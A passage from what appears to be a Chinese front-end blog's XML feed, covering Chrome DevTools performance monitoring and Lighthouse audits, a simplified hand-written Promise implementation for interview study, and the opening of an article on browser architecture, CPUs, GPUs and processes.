提供的性能监测功能已经较为完备，但是，它有两个问题：</p><ol><li>数据缺少实时性</li><li>数据面板过于复杂，不够直观</li></ol><p>为了解决这两个问题，Chrome 提供了 Performance monitor 功能，以实时直观的数据展示页面性能。</p><p>相比 Performance ，Performance monitor 所在的位置较为隐蔽，需要以下几个步骤才能打开：</p><ol><li>打开 Chrome 开发者工具</li><li>按“Esc”，打开附加面板</li><li>点击选项按钮，打开选项菜单</li><li>选择“Performance monitor”</li></ol><p>由于 Performance monitor 是实时的，所以，进入面板后，Performance monitor 将会自动运行，记录页面性能数据，通过点击左侧的选项，可以调整记录的数据类型。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237407434-b08210b3-5a80-4a2d-ac10-4db029112cec.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237407434-b08210b3-5a80-4a2d-ac10-4db029112cec.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="performance moniitor.jpg"></p><p>相比 Performance，Performance monitor 的功能虽然不够全面，但胜在简洁、实时。通常情况下，可以通过 Performance monitor 来分析页面使用过程中的性能问题，例如：动画性能等。</p><p><a name="Audits"></a></p><h3 id="Audits"><a href="#Audits" class="headerlink" title="Audits"></a>Audits</h3><p>虽然 Performance 以及 Performance monitor 提供了大量性能数据，但是，如果开发者经验不足，复杂的性能数据无异于天书。那么，Chrome 能不能自动分析出页面的性能缺陷，给出具体的性能优化点呢？万幸，Chrome 提供了 Audits。</p><p>Audits 源于著名的开源自动化分析插件——Lighthouse，Lighthouse 不仅能够分析页面性能，还能够对 PWA、无障碍访问、SEO 等进行测试评分，并给出优化建议。为了方便开发者使用，在 Chrome 60 版本，Chrome 开发团队直接将其加入 Chrome 开发者工具中的 Audits 面板中。</p><p>Lighthouse 转正之后，使用该功能不需要安装额外的 Chrome 插件，只需要进入 Audits 面板，点击 Run audits 按钮即可生成一份页面分析报告，如下所示：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237418556-4b5dc443-fe24-46a3-a951-7192ce573da6.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237418556-4b5dc443-fe24-46a3-a951-7192ce573da6.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="audits.jpg"></p><p>通过结果可以看到，Audits 不仅能够自动分析出页面的缺陷，还能根据缺陷给出具体的优化建议。这就意味着，使用了 Audits 之后，我们只需要按照 Audits 给出的优化建议逐条尝试，即可大幅度提高页面性能，实乃前端偷懒神器~</p><p><a name="c1163678"></a></p><h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p>之前我们一直说的是基于 Chrome 浏览器的性能监测方案，但是，其实还有一种不基于浏览器的性能监测方案：编程式性能监测。</p><p>编程式性能监测主要依托于 W3C 推出的 Performance API，该套 API 的目的是简化开发者对网站性能进行精确分析与控制的过程，方便开发者采取手段提高 web 性能。</p><p>相比之前的性能监测方法，Performance API 最大的优点是：灵活、精确，所以一经推出便风靡全球。比如，Vue 中便封装了 Performance API 方便开发者进行性能追踪。</p><p>由于篇幅有限，在此不再赘述，有兴趣的同学可以自行了解。</p><p><a name="25f9c7fa"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>性能监测是前端性能优化的第一步，只有学会了性能监测，我们才能更好地剖析性能问题，直至彻底解决性能问题。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 性能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise A+ 规范</title>
      <link href="/2021/03/17/frontend/interview/promise-a-gui-fan/"/>
      <url>/2021/03/17/frontend/interview/promise-a-gui-fan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>Promise 对象用于表示一个异步操作的最终完成（或失败）及其结果值。<br><a name="Arniy"></a></p><h1 id="Promise-A-规范"><a href="#Promise-A-规范" class="headerlink" title="Promise A+ 规范"></a>Promise A+ 规范</h1><p><a href="http://malcolmyu.github.io/malnote/2015/06/12/Promises-A-Plus/">Promise A+ 规范</a><br><a name="Kgt2P"></a></p><h1 id="手写-Promise"><a href="#手写-Promise" class="headerlink" title="手写 Promise"></a>手写 Promise</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PENDING</span> = <span class="string">&#x27;pending&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">RESOLVED</span> = <span class="string">&#x27;resolved&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">REJECTED</span> = <span class="string">&#x27;rejected&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">asyncFun</span> = (<span class="params">fn</span>) =&gt; &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(fn, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Promise_</span> &#123;</span><br><span class="line"></span><br><span class="line">    status;</span><br><span class="line">    resolver;</span><br><span class="line">    rejecter;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">executor, options</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">status</span> = <span class="variable constant_">PENDING</span>;</span><br><span class="line">        <span class="title function_">executor</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">status</span> = <span class="variable constant_">RESOLVED</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">resolver</span>?.(res);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">status</span> = <span class="variable constant_">REJECTED</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">rejecter</span>?.(err);</span><br><span class="line">                <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="title class_">Error</span>(err);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">then</span>(<span class="params">resolver, rejecter</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">resolver</span> = resolver;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">rejecter</span> = rejecter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">reject</span>(<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="title class_">Promise</span>_) <span class="keyword">return</span> value;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(value);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">all</span>(<span class="params">promisers</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">const</span> resArr = [];</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">resolver</span> = (<span class="params">res, index</span>) =&gt; &#123;</span><br><span class="line">                resArr[index] = res;</span><br><span class="line">                count++;</span><br><span class="line">                <span class="keyword">if</span>(count === promisers.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(resArr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">rejecter</span> = (<span class="params">err</span>) =&gt; &#123;</span><br><span class="line">                <span class="title function_">reject</span>(err)</span><br><span class="line">            &#125;;</span><br><span class="line">            promisers.<span class="title function_">map</span>(<span class="function">(<span class="params">promiser, index</span>) =&gt;</span> &#123;</span><br><span class="line">                promiser.<span class="title function_">then</span>(</span><br><span class="line">                    <span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">resolver</span>(res, index),</span><br><span class="line">                    <span class="function"><span class="params">err</span> =&gt;</span> <span class="title function_">rejecter</span>(err)</span><br><span class="line">                );</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">race</span>(<span class="params">promisers</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">resolver</span> = res =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(!flag) &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="title function_">resolve</span>(res);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">rejecter</span> = err =&gt; &#123;</span><br><span class="line">                <span class="title function_">reject</span>(err)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            promisers.<span class="title function_">map</span>(<span class="function"><span class="params">promiser</span> =&gt;</span> &#123;</span><br><span class="line">                promiser.<span class="title function_">then</span>(</span><br><span class="line">                    resolver,</span><br><span class="line">                    rejecter</span><br><span class="line">                );</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">any</span>(<span class="params">promisers</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> stopReject = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">resolver</span> = res =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(!stopReject) &#123;</span><br><span class="line">                    stopReject = <span class="literal">true</span>;</span><br><span class="line">                    <span class="title function_">resolve</span>(res);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> errs = [];</span><br><span class="line">            <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">rejecter</span> = err =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(stopReject) <span class="keyword">return</span>;</span><br><span class="line">                count++;</span><br><span class="line">                errs.<span class="title function_">push</span>(err);</span><br><span class="line">                <span class="keyword">if</span>(count === promisers.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(errs);</span><br><span class="line">                    <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AggregateError</span>(errs)</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            promisers.<span class="title function_">map</span>(<span class="function"><span class="params">promiser</span> =&gt;</span> &#123;</span><br><span class="line">                promiser.<span class="title function_">then</span>(</span><br><span class="line">                    resolver,</span><br><span class="line">                    rejecter</span><br><span class="line">                );</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise1 = <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">// reject(&#x27;发生错误1&#x27;)</span></span><br><span class="line">    &#125;, <span class="number">100</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="number">2</span>)</span><br><span class="line">        <span class="comment">// reject(&#x27;发生错误2&#x27;)</span></span><br><span class="line">    &#125;, <span class="number">50</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise3 = <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="number">3</span>)</span><br><span class="line">        <span class="comment">// reject(&#x27;发生错误3&#x27;)</span></span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>_.<span class="title function_">race</span>([promise1, promise2, promise3]).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise4 = <span class="title class_">Promise</span>_.<span class="title function_">resolve</span>(promise3);</span><br><span class="line">promise4.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise5 = <span class="title class_">Promise</span>_.<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;fail&#x27;</span>));</span><br><span class="line"></span><br><span class="line">promise5.<span class="title function_">then</span>(</span><br><span class="line">    <span class="function">() =&gt;</span> &#123;&#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> js </tag>
            
            <tag> es6 </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代浏览器内部揭秘</title>
      <link href="/2021/03/16/frontend/browser/xian-dai-liu-lan-qi-nei-bu-jie-mi/"/>
      <url>/2021/03/16/frontend/browser/xian-dai-liu-lan-qi-nei-bu-jie-mi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="f3a2f325"></a></p><h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p>从高级视角对浏览器架构与多进程架构的优点进行阐述。我们也对 Chrome 中与多进程架构密切相关的服务化与站点隔离进行了讲解。<br><a name="5c888d03"></a></p><h2 id="CPU、GPU、内存和多进程体系结构"><a href="#CPU、GPU、内存和多进程体系结构" class="headerlink" title="CPU、GPU、内存和多进程体系结构"></a>CPU、GPU、内存和多进程体系结构</h2><p>这一博客系列由四部分组成，将从高级体系结构到渲染流程的细节来窥探 Chrome 浏览器的内部。如果你曾对浏览器是如何将代码转化为具有功能的网站，或者你并不确定为何建议使用某一技术来提升性能，那么本系列就是为你准备的。</p><p>本文作为此系列的第一部分，将介绍核心计算术语与 Chrome 的多进程体系架构。</p><p><strong>提示：</strong> 如果你已熟悉 CPU&#x2F;GPU，进程&#x2F;线程的相关概念，可以直接跳到<a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84">浏览器架构</a>部分开始阅读。</p><p><a name="b70385d9"></a></p><h2 id="计算机的核心是-CPU-与-GPU"><a href="#计算机的核心是-CPU-与-GPU" class="headerlink" title="计算机的核心是 CPU 与 GPU"></a>计算机的核心是 CPU 与 GPU</h2><p>为了了解浏览器运行的环境，我们需要了解几个计算机部件以及它们的作用。</p><p><a name="CPU"></a></p><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615206916-bd6e36d0-2361-45d1-8003-41e113c8a57f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615206916-bd6e36d0-2361-45d1-8003-41e113c8a57f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 1：4 个 CPU 核心作为办公人员，坐在办公桌前处理各自的工作</p><p>第一个需要了解的计算机部件是 <strong>中央处理器（Central Processing Unit）</strong>，或简称为 <strong>CPU</strong>。CPU 可以看作是计算机的大脑。一个 CPU 核心如图中的办公人员，可以逐一解决很多不同任务。它可以在解决从数学到艺术一切任务的同时还知道如何响应客户要求。过去 CPU 大多是单芯片的，一个核心就像存在于同芯片的另一个 CPU。随着现代硬件发展，你经常会有不止一个内核，为你的手机和笔记本电脑提供更多的计算能力。</p><p><a name="GPU"></a></p><h3 id="GPU"><a href="#GPU" class="headerlink" title="GPU"></a>GPU</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615214916-e56c86c5-73d2-435b-a15d-a4d054a497e9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615214916-e56c86c5-73d2-435b-a15d-a4d054a497e9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 2：许多带特定扳手的 GPU 内核意味着它们只能处理有限任务</p><p><strong>图形处理器</strong>（<strong>Graphics Processing Unit</strong>，简称为 <strong>GPU</strong>）是计算机的另一部件。与 CPU 不同，GPU 擅长同时处理跨内核的简单任务。顾名思义，它最初是为解决图形而开发的。这就是为什么在图形环境中“使用 GPU” 或 “GPU 支持”都与快速渲染和顺滑交互有关。近年来随着 GPU 加速计算的普及，仅靠 GPU 一己之力也使得越来越多的计算成为可能。</p><p>当你在电脑或手机上启动应用时，是 CPU 和 GPU 为应用供能。通常情况下应用是通过操作系统提供的机制在 CPU 和 GPU 上运行。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615221906-3c30dd92-c25a-4932-988d-b43103afd2f4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615221906-3c30dd92-c25a-4932-988d-b43103afd2f4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 3：三层计算机体系结构。底部是机器硬件，中间是操作系统，顶部是应用程序。</p><p><a name="0db1a238"></a></p><h2 id="在进程和线程上执行程序"><a href="#在进程和线程上执行程序" class="headerlink" title="在进程和线程上执行程序"></a>在进程和线程上执行程序</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615229734-f013746e-2986-422f-a34c-14e878197431.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615229734-f013746e-2986-422f-a34c-14e878197431.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图四：进程作为边界框，线程作为抽象鱼在进程中游动</p><p>在深入学习浏览器架构之前需要了解的另一个理论是进程与线程。进程可以被描述为是一个应用的执行程序。线程存在于进程并执行程序任意部分。</p><p>启动应用时会创建一个进程。程序也许会创建一个或多个线程来帮助它工作，这是可选的。操作系统为进程提供了一个可以使用的“一块”内存，所有应用程序状态都保存在该私有内存空间中。关闭应用程序时，相应的进程也会消失，操作系统会释放内存。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615438699-00069387-aaa0-4594-95fd-1875d9d4b287.svg#height=469&id=fyFkB&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252656&status=done&style=none&title=&width=853" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615438699-00069387-aaa0-4594-95fd-1875d9d4b287.svg#height=469&id=fyFkB&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252656&status=done&style=none&title=&width=853" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="1..svg"></p><p>图 5 ：进程使用内存空间和存储应用数据的示意图</p><p>进程可以请求操作系统启动另一个进程来执行不同的任务。此时，内存中的不同部分会分给新进程。如果两个进程需要对话，他们可以通过<strong>进程间通信</strong>（<strong>IPC</strong>）来进行。许多应用都是这样设计的，所以如果一个工作进程失去响应，该进程就可以在不停止应用程序不同部分的其他进程运行的情况下重新启动。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615773729-459bc3e3-9d03-4af9-a5d0-5a11276a034f.svg#height=470&id=caSEM&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=293505&status=done&style=none&title=&width=855" class="lazyload placeholder" 